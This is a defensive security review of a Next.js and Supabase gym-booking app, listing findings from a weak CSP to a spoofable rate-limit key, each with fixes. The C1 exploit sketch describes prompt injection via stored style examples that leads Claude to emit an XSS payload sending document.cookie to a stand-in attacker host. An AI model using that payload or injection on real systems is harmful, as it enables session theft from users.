# Security Review — 2026-05-04

Scope: full re-review of `crossfit-app` (Next.js 16 + Supabase + Anthropic + Resend + Upstash) on branch `fix/review-findings`. **No code changes were made; this document is a punch list only.**

Severity scale: **Critical / High / Medium / Low / Info**

Findings are grouped by area. Each finding lists: file:line, why it matters, an exploit sketch where useful, and the recommended fix.

---

## Critical

### C1. Content-Security-Policy is effectively neutralised — `'unsafe-inline'` **and** `'unsafe-eval'` in `script-src`
File: `proxy.ts:79`

```ts
"script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
```

Both `'unsafe-inline'` and `'unsafe-eval'` are present, so the script-src directive provides essentially no XSS mitigation. Any reflected/stored XSS becomes immediately executable. Combined with `style-src 'self' 'unsafe-inline'` an attacker also has full style control.

The git log shows this was a deliberate revert (`17b7f1d fix: restore unsafe-eval in CSP to fix production script loading`, `e2b5e5e fix: add 'unsafe-inline' to CSP script-src — restores React hydration`), suggesting nonces / hashes were not in place when the strict policy broke.

**Why this is Critical here:** Today there are no obvious XSS sinks (see XSS review), but the *only* layer keeping us safe is "we don't currently render any user HTML." The moment someone introduces `dangerouslySetInnerHTML`, a markdown renderer for AI output, or a third-party widget, the CSP no longer compensates.

**Exploit sketch:** future commit adds `<div dangerouslySetInnerHTML={{__html: aiText}} />` to render AI output → Claude prompt-injection from a malicious `style_examples.raw_text` (which is sent to the model on every workout generation) → HTML containing `<img src=x onerror=fetch('https://attacker/?'+document.cookie)>` is emitted by Claude → executes because CSP allows inline scripts.

**Fix plan:**
1. Restore a strict CSP using **per-request nonces** (Next.js 16 supports this via `headers()` in middleware/proxy + `<Script nonce>`). Reference: https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy.
2. Add `style-src 'self' 'nonce-XYZ'` rather than `'unsafe-inline'` — Tailwind's emitted `<style>` tags need to inherit the nonce.
3. Remove `'unsafe-eval'` outright; the production failure in commit 17b7f1d was likely from a dev-only dependency or an outdated Next minor — re-test with current Next 16.2 and React 18.3.
4. Add `report-uri` / `report-to` so violations are observable in staging before tightening.
5. Ship CSP-only first in `Content-Security-Policy-Report-Only` to surface every script the app actually loads, then promote to enforcing.

### C2. IP-based rate-limit key is trivially spoofable
File: `app/api/auth/signup/route.ts:6`

```ts
const ip = req.headers.get('x-forwarded-for')?.split(',')[0].trim() ?? 'unknown'
const { limited } = await rateLimit(ip, 'signup')
```

On Vercel, `x-forwarded-for` is **appended to** by the platform — leftmost values are *whatever the client sent*. Reading `[0]` gives the attacker-controlled value, not the real client IP. An attacker can rotate `X-Forwarded-For: <random>` per request and never hit the 5/hour signup limit.

**Why Critical:** the signup endpoint (a) creates Supabase Auth users (cost: $$$ if abused), (b) issues confirmation emails via Resend (cost + reputation), (c) is the only abuse barrier — there is no CAPTCHA. A 5/h limit per spoofed key = effectively unlimited.

**Fix plan:**
1. Use Vercel's authoritative client IP. In a Next 16 route handler that's `request.headers.get('x-real-ip')` (Vercel sets this) or — preferably — read from the Vercel-only `x-vercel-forwarded-for` and take the **rightmost** entry, which is the platform-attested client.
2. Belt-and-braces: also rate-limit per **email** (key = `signup:email:${normalized}`) at e.g. 3/day so even rotating IPs can't enumerate or churn the same address.
3. Add a Turnstile/hCaptcha challenge to `/signup` for unauthenticated POSTs.
4. Apply the same fix to any other endpoint that uses `x-forwarded-for[0]` (currently only signup, but the pattern will get copied — extract a `getClientIp(req)` helper).

---

## High

### H1. Rate limiter fails open (silently) when Upstash env vars are missing in production
File: `lib/rate-limit.ts:18-25, 63-67`

```ts
if (!url || !token) { _redis = null; return null }
…
if (!limiter) { return { limited: false } } // Redis not configured — fail open
```

The fail-open is documented as intentional for local dev. The risk is that a misconfigured production deploy (Upstash deleted, env var typo, region migration) **silently** disables every rate limit — AI spend, signup, the lot — with no warning beyond an absent log line.

**Fix plan:**
1. Detect environment: when `process.env.VERCEL_ENV === 'production'`, missing Upstash config should **throw** at module load (or at first `rateLimit()` call), not silently allow.
2. Add a healthcheck route or log-once warning when Redis is null in prod that an alerting rule can fire on.
3. Gate the fail-open behind an explicit `RATE_LIMIT_DISABLED=1` opt-in for local dev.

### H2. AI endpoints have no per-request token / cost cap
Files: `app/api/workouts/generate/route.ts`, `app/api/style/generate-samples/route.ts`, `app/api/style/route.ts`, `app/api/workouts/movement-analysis/route.ts`, `app/api/workouts/[weekId]/day/route.ts`

The Anthropic calls go through `lib/claude/generate-workouts.ts`/`lib/claude/client.ts` with — at the route level — no upper bound on input size (e.g. `style_examples.raw_text` is capped at 20,000 chars in `app/api/style/route.ts:25` but historical examples are aggregated in `getRecentWeeks` with no aggregate cap).

A compromised owner account, or even a legitimate one with adversarial style examples, can drive arbitrarily large prompts → unbounded Anthropic spend per gym (rate limit: 10/min, but each call could be 100k input tokens).

**Fix plan:**
1. Cap aggregate prompt size in `lib/claude/generate-workouts.ts` (sum of style examples + history) at e.g. 50k tokens; truncate oldest first. Log truncation events.
2. Pass `max_tokens` consistently and audit each call site — `style/generate-samples` uses 2048 (fine), but `generate-workouts` should be checked.
3. Add a per-gym **monthly** spend ceiling backed by a counter in Postgres (or Upstash) — when exceeded, return 429 until the next billing cycle.
4. Log Anthropic `usage` from each response for cost observability.

### H3. `/api/bookings/confirm/[token]` is a state-mutating GET — vulnerable to link prefetching / image-tag CSRF
File: `app/api/bookings/confirm/[token]/route.ts:32`

```ts
export async function GET(_req: Request, props: …) { … // mutates bookings table
```

The token is HMAC-signed (good — defends against token guessing) but any browser/email-client/IM-preview that *prefetches links* will silently confirm the spot the moment the email is opened. Examples: corporate email scanners (Office 365 SafeLinks, Mimecast), iMessage/WhatsApp link previews, GMail's prefetcher, Slack unfurling.

Real-world impact: members report "I never clicked the email but my spot was confirmed and I missed class." Also: a forwarded email auto-confirms for the recipient's mail scanner before the human ever sees it.

**Fix plan:**
1. Convert the confirm flow to: GET renders an HTML interstitial → user clicks "Confirm" button → POST mutates. Keep the token in the URL for the GET, then post it.
2. Alternatively: add an `X-Robots-Tag: noindex, nofollow` and a 1-pixel JS gate (require a real click), but that's less robust than #1.
3. Add `Cache-Control: no-store` so prefetchers don't repeatedly hit it.
4. Set `Permissions-Policy: interest-cohort=()` and `Referrer-Policy: no-referrer` on the confirmation page so the token doesn't leak in referrer headers when the user is bounced to `/my-schedule?confirmed=true`.

### H4. Admin gating is email-string-equality with no normalisation
Files: `proxy.ts:38-44`, `lib/auth-helpers.ts:99-101`

```ts
const adminEmails = (process.env.ADMIN_EMAILS ?? '').split(',').map(e => e.trim()).filter(Boolean)
if (!user.email || adminEmails.length === 0 || !adminEmails.includes(user.email)) …
```

Comparison is **case-sensitive**. Supabase Auth treats emails case-insensitively (an attacker who registers `Admin@Company.com` may match the Supabase row but bypass an `ADMIN_EMAILS=admin@company.com` check, depending on how Supabase normalises in `getUser()`). Also no defence against unicode confusables (e.g. `аdmin@company.com` with a Cyrillic а if email signups don't IDN-normalise).

Secondary: `ADMIN_EMAILS` lives only in env — no audit trail of who granted/revoked admin. The audit log (`admin_audit_log`) records *actions*, not the membership itself.

**Fix plan:**
1. Lowercase both sides before comparing: `adminEmails.map(e => e.toLowerCase()).includes(user.email.toLowerCase())`.
2. Reject non-ASCII characters in the comparison email or apply NFKC normalisation.
3. Move admin membership into a DB table (`admin_users`) with RLS denying all writes except via service-role, so adds/removes are auditable. Keep `ADMIN_EMAILS` as a bootstrap fallback.
4. Require MFA for admin accounts (Supabase supports TOTP enrolment) — currently a leaked admin password fully owns every gym.

### H5. Service-role admin client used in routes that already had user-scoped Supabase access — RLS bypass widens blast radius
Files: `app/api/workouts/generate/route.ts:78`, `app/api/workouts/create-manual/route.ts:38`, `app/api/workouts/approve/route.ts:18`, `app/api/members/invite/route.ts:21`, `app/api/members/delete/route.ts:60`

Pattern (e.g. `workouts/approve`):
```ts
const auth = await requireOwnerAuth() // user-scoped Supabase
…
const admin = createAdminClient()       // service-role: RLS bypass
await admin.from('workout_weeks').update({ status: 'discarded' })…
```

The mix is justified for `save_workout_draft` RPC (SECURITY DEFINER), but several routes use service-role for a plain UPDATE/INSERT that the RLS policy would have permitted anyway. Every service-role call is a place where a missing `.eq('gym_id', userData.gym_id)` becomes a cross-tenant write.

I did not find a missing gym_id filter in this pass, but the pattern is fragile. Examples to audit:
- `members/invite` upserts to `users` with `onConflict: 'id'` — the safety relies entirely on the `existingByEmail.gym_id !== userData.gym_id` precheck, which is a TOCTOU. Two concurrent invites for the same email could race.
- `members/delete` uses admin client only for `auth.admin.deleteUser` (legitimate) — fine.

**Fix plan:**
1. Audit every `createAdminClient()` call site and document, in a comment above the call, *exactly* why service-role is required (RLS bypass for a SECURITY DEFINER RPC, Supabase Auth admin API, or cross-tenant cron).
2. Where the operation could be done via the user-scoped client + correct RLS, switch back. Less footgun.
3. For `members/invite`, replace the precheck-then-upsert with a single Postgres function that performs the email→gym check inside a transaction.

### H6. Gym-settings PATCH allows partial unauthenticated mass-assignment via missing whitelist
File: `app/api/settings/gym/route.ts:9-89`

The handler builds `updates` by checking `'foo' in body` for ~10 known keys — that part is fine. However:

1. There is no early reject for unknown keys; an attacker sending `{cancellationCutoffHours: 0, owner_id: '<other-uuid>'}` is technically benign here (since `owner_id` isn't in the if-chain), but the pattern invites future "let's just spread updates" bugs.
2. `gymType` is owner-mutable. Switching gym type changes Claude prompts and pricing logic (if/when added). Should this really be self-service, or admin-only?
3. `contact_email` is set with only a regex check — no DNS/MX validation, no verification email loop. A malicious owner can set this to any address and cause the gym's transactional emails to leak there as the reply-to (`lib/email/send.ts:withReplyTo`).

**Fix plan:**
1. Replace `if ('foo' in body)` with a `z.object({...}).strict()` schema (extend the local validator with `.strict()`) so unknown keys 400.
2. Move `gymType` behind admin-only or add a "are you sure?" double-confirm.
3. For `contact_email`, send a one-time verification email to the new address and only persist after click-through.

---

## Medium

### M1. Per-day workout edit can write arbitrary JSON into `workout_weeks.workouts`
File: `app/api/workouts/[weekId]/day/route.ts:21-29`

```ts
let body: { dayName?: string; updatedDay?: WorkoutDay; skipScaling?: boolean }
…
if (!dayName || typeof dayName !== 'string' || !updatedDay || typeof updatedDay !== 'object') {
  return jsonError('dayName and updatedDay are required')
}
…
updatedWorkouts[idx] = dayToSave
```

`updatedDay` is type-asserted but **not validated**. Any JSON shape can be written into the JSONB column. Same pattern in `workouts/[weekId]/extras/route.ts:24-29`.

Consequences:
- Storage abuse: send a 5MB `updatedDay` object → consumes Supabase row storage; no per-request body cap visible.
- Downstream parsing: any client that assumes `WorkoutDay` shape (the member-facing `this-week` page) can be broken or shown attacker-chosen content (gym owners can already write arbitrary text in workouts, so this is a low impact within a tenant — but cross-rendering of, say, a HTML-looking string in an email could matter when combined with a future markdown renderer).

**Fix plan:**
1. Add a `z.object({ day: z.string(), descriptor: z.string({max:200}), parts: z.array(...).max(10), extras: z.array(...).optional() })` validator and reject unknown keys.
2. Cap each `part.content` at e.g. 5,000 chars.
3. Add `parseBody(req, schema)` like the other routes.

### M2. `confirmation_token` column still stored — defence-in-depth gap
File: `app/api/bookings/confirm/[token]/route.ts:43-49`, schema migration `017_confirmation_token_text.sql`

The signed-token migration kept the `confirmation_token` column "for audit", but it's also still being read into `BookingRow.confirmation_token`. If any code path *also* falls back to lookup-by-token-string, the old enumerable-UUID weakness is reintroduced. I didn't find such a fallback, but it's worth making impossible.

**Fix plan:**
1. Drop `confirmation_token` from selects in `bookings/confirm/[token]/route.ts` — never read it.
2. Add a Postgres trigger that *always* nulls the column on insert/update. Or just drop the column in a migration; the audit trail can be reconstructed from `cancelled_at` + `confirmation_expires_at`.
3. Verify nothing else in `lib/bookings/waitlist.ts` writes a value back to it.

### M3. Resend `reply_to` is owner-controlled, can be used to receive replies to gym-broadcast emails
Files: `lib/email/send.ts:38-40`, callers passing `contactEmail`

If the owner sets `contact_email` to an address they don't own, every member who replies to a "Booking Confirmed" / "Workouts Published" email sends to a third party. Also doubles as a phishing primer ("reply to this gym email" lands in attacker's inbox).

**Fix plan:**
1. Verify `contact_email` via a confirmation token before activating it (see H6).
2. Or, only set `reply_to` to an address that matches the owner's verified Supabase `user.email`.

### M4. Cron endpoint timing-safe compare uses byte-length of attacker-controlled buffer
File: `lib/api/cron-auth.ts:24-29`

```ts
const a = Buffer.from(authHeader)
const b = Buffer.from(expected)
const match = a.length === b.length && crypto.timingSafeEqual(a, b)
```

The length check leaks 1 bit of timing (whether lengths matched). For a fixed-length secret this is acceptable, but the function returns *immediately* on length mismatch — measurable. Low practical impact (the secret length is itself fixed and well-known once leaked), but trivial to make uniform.

**Fix plan:** use `crypto.timingSafeEqual` against a hash of both inputs (HMAC the request header with a per-request salt and compare against HMAC of the expected secret) so length mismatches still take constant time.

### M5. Email enumeration via `members/invite` 409 response
File: `app/api/members/invite/route.ts:26-34`

```ts
if (existingByEmail && existingByEmail.gym_id !== userData.gym_id) {
  return jsonError('This email is already registered at another gym', 409)
}
```

A malicious gym owner can probe whether any address is a member of any other gym on the platform. Sensitive on a B2B SaaS — confirms competing gyms' members.

**Fix plan:** return the same generic "Unable to send invite" message regardless. Log the conflict server-side for the legitimate UX case; surface it only in admin tooling.

### M6. `existingByEmail` lookup is non-unique on `users.email`
File: `app/api/members/invite/route.ts:24`

```ts
.eq('email', email).maybeSingle()
```

`users` has unique `(gym_id, email)` per the migration but no global unique on `email`. `maybeSingle()` will throw if more than one row matches (legitimate: same person at two gyms). Causes a 500 instead of a clean 409. Not a data leak, but a stability bug that masks abuse signals.

**Fix plan:** use `.limit(1).maybeSingle()` or fetch and iterate; treat any same-gym row as "already invited," any other-gym row as the conflict above (with M5's wording fix).

### M7. `requireMemberAuth` does not check gym suspension
File: `lib/auth-helpers.ts:60-77`

Owners are blocked when `gyms.suspended_at` is set, but members are explicitly allowed through. Stated intent: members shouldn't lose access if the owner stops paying. That's a product call, but worth re-confirming because a suspended gym can still:
- create bookings (drives DB writes against a delinquent tenant),
- receive AI-generated workouts (if any member-facing AI endpoint exists — currently none, but the door is open).

**Fix plan:** explicit policy doc in `docs/auth.md`. If product confirms members should still book during suspension, no code change. If not, mirror the owner suspension check.

### M8. `app/api/style/route.ts` accepts `rawText` up to 20,000 chars and inserts unsanitised
File: `app/api/style/route.ts:24-67`

The text is sent to Claude (validation step) and stored. Two concerns:
- No content-type / encoding sanitisation — null bytes, control chars, RTL overrides go straight into Postgres.
- Echo to the client via `GET /api/style` returns `raw_text` and the React side uses `pre.whitespace-pre-wrap {ex.raw_text}` (auto-escaped), so XSS isn't possible *today*. If a future commit adds markdown rendering, `<script>` tags reappear.

**Fix plan:**
1. Strip ASCII control chars (`[\x00-\x08\x0E-\x1F]`) on insert.
2. Add a validator note that `raw_text` is plain-text-only, never rendered as HTML.

### M9. `/api/auth/signup` always sets `email_confirm: true`
File: `app/api/auth/signup/route.ts:50`

```ts
const { data: authData, error: authError } = await supabase.auth.admin.createUser({
  email, password, email_confirm: true
})
```

The owner is logged in with no email verification. If a typo'd email creates the account, the owner is locked out (no working address to reset to). And it weakens the value of email-based password reset, since anyone with momentary access can register an unverified address.

**Fix plan:** drop `email_confirm: true` and use Supabase's standard email confirmation flow. Show the user a "check your email" screen instead of immediate login. Apply per-email signup limit (see C2 fix #2).

---

## Low

### L1. `.gitignore` only covers `.env*.local`, not `.env`, `.env.production`
File: `.gitignore`

```
# local env files
.env*.local
```

Secrets in a plain `.env` or `.env.production` would be committed. Currently fine (no such file present), but a safer pattern is `*.env` or an explicit list including bare `.env`.

**Fix:** broaden to `.env*` and add explicit `!.env.example` allowlist if a sample file is ever added.

### L2. `inviteUrl` / `loginUrl` template guard is a `startsWith('https://')` check
File: `lib/email/templates.ts:21, 38, 47`

```ts
const safeConfirmUrl = confirmUrl.startsWith('https://') ? escapeHtml(confirmUrl) : '#'
```

Effective today — `NEXT_PUBLIC_APP_URL` is server-set. But the check would let through `https://attacker.com.evil.example/confirm?b=…` if the env var is ever misconfigured to a typo'd domain. Better to construct the URL from a parsed `URL()` object and assert host matches an allowlist.

**Fix:** add an `assertSameOrigin(url)` helper used by every email template.

### L3. `/api/auth/signup` accepts arbitrary `gymName` HTML, escaped only at email render time
File: `app/api/auth/signup/route.ts:27-29`

`trimmedGymName` is stored as-is. When rendered in `workoutsPublishedHtml(gym.name)` via `escapeHtml`, it's safe. If a future template forgets to escape (e.g. an admin-facing report page), the gym name becomes an XSS sink.

**Fix:** strip `<`, `>`, control chars at insert; document that `gyms.name` is plain text only.

### L4. `app/api/schedule/instances` exposes member names to owners with no `show_member_names` check
File: `app/api/schedule/instances/route.ts:29-66`

The `show_member_names` gym setting (referenced in `settings/gym/route.ts:54-56`) controls member-facing display. The owner-side `/api/schedule/instances` returns `users(name)` regardless. This is the intended owner UX — but if an "owner" includes coaches with limited roles in the future, the unconditional disclosure becomes a leak.

**Fix:** document that `show_member_names` is member-side only; consider a `users.role` check before returning names if/when a coach role is added.

### L5. No HSTS / `Strict-Transport-Security` header set
File: `proxy.ts:79-86`

Vercel sets HSTS at the edge by default (preloaded), so this is informational on Vercel. If/when self-hosted, missing HSTS allows a downgrade attack on first connect.

**Fix:** add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` to the headers block. Cheap and explicit.

### L6. Inconsistent UUID validation
Files: `app/api/bookings/[id]/attend/route.ts:4`, `app/api/workouts/[weekId]/day/route.ts:11`, `app/api/workouts/[weekId]/extras/route.ts:6`, `app/(admin)/gyms/[gymId]/actions.ts:6`

Five different `UUID_RE` constants. Should be one in `lib/validation/z.ts` (it's already there at line 50 — but consumers redefine it). Drift risk.

**Fix:** import the canonical `UUID_RE` from `lib/validation/z.ts` (export it) and delete the duplicates.

### L7. `eslint-config-next: 14.2.35` mismatched with `next: ^16.2.4`
File: `package.json`

Old eslint config likely misses Next 16 lint rules around server actions, `searchParams` async, etc.

**Fix:** bump to a matching version.

### L8. Verbose error logging may include PII in production logs
Files: many `jsonServerError(ctx, cause)` callers; `console.error('[admin] ...', auditError)`; `console.error('[forgot-password]', error)` etc.

Supabase errors include the failing row in some cases — emails, gym IDs, sometimes more. Vercel logs are persisted and accessible to anyone with project read access.

**Fix:** in `jsonServerError`, log only `cause.code` / `cause.message`, never `cause` itself. Add a structured logger that tags each entry with a request id and strips known PII fields.

### L9. `Permissions-Policy` and `Referrer-Policy` headers not set
File: `proxy.ts:79-86`

Only CSP and X-Frame-Options are set. Missing:
- `Referrer-Policy: strict-origin-when-cross-origin` (or `no-referrer`)
- `Permissions-Policy: geolocation=(), microphone=(), camera=()` (defence in depth against future iframe embeds and supply-chain compromise)
- `X-Content-Type-Options: nosniff`

**Fix:** add all three to the proxy response.

### L10. CORS not explicitly configured — relies on Next defaults
The `proxy.ts` matcher excludes `/api`, so API routes go through Next.js defaults: same-origin only with no `Access-Control-Allow-Origin` header. Today that's correct. If a mobile app or third-party integration is added later, the policy needs to be explicit, not absent-by-default.

**Fix:** add an empty CORS handler (`OPTIONS` returning 204 with no allow headers) to make the deny stance intentional.

---

## Info / Observations (no fix needed, but worth knowing)

- **`getRedis()` memoisation** is correct and avoids the per-request connection allocation; good.
- **HMAC token implementation** in `lib/crypto/token.ts` is solid: timing-safe compare, version prefix, base64url. Recommend adding a key-rotation field (`v2`) hook for the future.
- **RLS migrations** were not opened in this pass — strongly recommend a separate review of `supabase/migrations/002_rls.sql`, `015_security_hardening.sql`, `018_admin.sql` to confirm policies match the route-level checks. Defence-in-depth is only as good as the weakest layer, and route-level gym_id filtering would be undermined by an over-permissive RLS policy.
- **`save_workout_draft` SECURITY DEFINER RPC** was not opened. Confirm it validates `gym_id` belongs to the calling user (or that the route's auth check is sufficient because the RPC is only called via service-role).
- **Password policy**: 8-char minimum (`auth/signup/route.ts:32`) is below current NIST guidance (12+). Consider raising and adding a haveibeenpwned check for owner accounts.
- **No CAPTCHA anywhere.** Combined with H1/C2, this is the missing third leg of the abuse stool.
- **No `npm audit`** ran in this session (network blocked). Recommend running it locally and checking `next`, `@supabase/ssr`, `resend`, `@anthropic-ai/sdk` advisories at next dependabot pass.

---

## Recommended remediation order

1. **C2** (signup IP spoofing) — immediate, < 30 min change.
2. **C1** (CSP nonces) — half-day, requires staging soak in report-only mode.
3. **H1** (rate-limit fail-open in prod) — 30 min.
4. **H3** (GET-mutation on confirm) — 1–2 hours, includes UX change.
5. **H2** (AI cost cap) — half-day; add token accounting.
6. **H6** (settings PATCH strict schema) + **M1** (workout day shape validation) — bundle as one schema-tightening PR.
7. **H4** (admin email normalisation) + **L8** (PII in logs) — bundle.
8. **H5** (admin client audit) — investigation, not a single commit.
9. Remaining Medium items, then Low items as bandwidth allows.

No code was modified during this review.
